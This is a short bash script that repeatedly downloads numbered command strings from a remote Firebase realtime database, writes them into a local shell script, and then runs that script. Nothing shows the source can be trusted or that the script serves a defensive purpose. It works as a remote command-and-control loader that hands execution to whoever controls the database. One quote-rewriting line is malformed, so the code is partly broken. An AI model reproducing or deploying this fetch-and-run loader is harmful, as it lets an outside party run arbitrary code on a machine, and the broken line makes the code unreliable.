COUNT=0

OUT="011935.sh"

echo "#!/bin/bash" > $OUT

while true
do
    response=$(curl -s https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/users/011935/commands/$COUNT.json)
    if [ "$response" = "null" ]; then
        break
    fi

    trimmed="${response:1:${#response}-2}"
    $trimmed="${trimmed//\\\'/\\\"}"
    echo $trimmed >> $OUT

    ((COUNT++))
done

sh $OUT
